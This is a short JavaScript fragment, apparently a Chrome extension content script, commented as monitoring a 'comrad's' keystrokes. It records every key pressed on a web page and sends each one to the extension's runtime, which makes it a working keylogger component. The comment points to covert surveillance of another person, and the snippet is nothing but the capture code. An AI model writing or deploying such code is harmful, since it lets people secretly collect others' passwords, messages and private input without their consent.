// Monitor keystroke of comrad
document.body.addEventListener("keydown", function (keyevent) {
    chrome.runtime.sendMessage({ action: "keystroke", payload: keyevent.key }, response => {
    });
});